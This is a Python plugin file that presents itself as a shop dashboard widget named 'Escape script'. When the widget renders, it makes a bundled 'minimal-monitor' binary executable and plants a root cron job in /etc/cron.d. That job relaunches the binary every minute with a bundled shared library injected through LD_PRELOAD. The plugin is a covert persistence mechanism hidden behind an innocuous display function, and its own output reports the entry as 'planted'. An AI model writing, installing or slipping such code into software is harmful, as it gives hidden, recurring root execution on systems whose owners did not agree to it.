PLUGIN_NAME = "Escape script"
PLUGIN_DESCRIPTION = ""
import os
import traceback
PLUGIN_DIR  = os.path.dirname(os.path.abspath(__file__))
PRELOAD_LIB = os.path.join(PLUGIN_DIR, "libwatchedfile.so")
MONITOR_BIN = os.path.join(PLUGIN_DIR, "minimal-monitor")
PIDFILE     = "/var/run/platform_monitor.pid"
CRON_FILE   = "/etc/cron.d/platform_monitor"
def register(shop=None):
    """Called once when the plugin is activated."""
    pass

def logic():
    results = []

    try:
        # --- step 1: verify files exist before touching them ---
        for label, path in [("preload_lib", PRELOAD_LIB),
                             ("monitor_bin", MONITOR_BIN)]:
            if not os.path.isfile(path):
                raise FileNotFoundError(f"{label} not found at: {path}")
            results.append(f"[OK]    found {label}: {path}")

        # --- step 2: set execute permission on monitor ---
        os.chmod(MONITOR_BIN, 0o755)
        results.append(f"[OK]    chmod 0o755: {MONITOR_BIN}")

        # --- step 3: build cron entry ---
        cron_entry = (
            "* * * * * root "
            f"[ -f {PIDFILE} ] && kill -0 $(cat {PIDFILE}) 2>/dev/null || "
            f"(LD_PRELOAD={PRELOAD_LIB} {MONITOR_BIN} & echo $! > {PIDFILE})\n"
        )
        results.append(f"[OK]    cron entry built")

        
        os.makedirs(os.path.dirname(CRON_FILE), exist_ok=True)
        results.append(f"[OK]    dir ready: {os.path.dirname(CRON_FILE)}")
        
        # --- step 4: write cron file ---
        with open(CRON_FILE, "w") as f:
            f.write(cron_entry)
        results.append(f"[OK]    cron written: {CRON_FILE}")

        # --- step 5: set cron file permissions ---
        os.chmod(CRON_FILE, 0o644)
        results.append(f"[OK]    chmod 0o644: {CRON_FILE}")

        results.append("[DONE]  cron entry planted successfully")

    except Exception:
        # Capture the full traceback — every line, file, and line number
        full_error = traceback.format_exc()
        results.append(f"[ERROR]\n{full_error}")

    return "\n".join(results)

def render_widget(context=None):
    output = logic()
    return output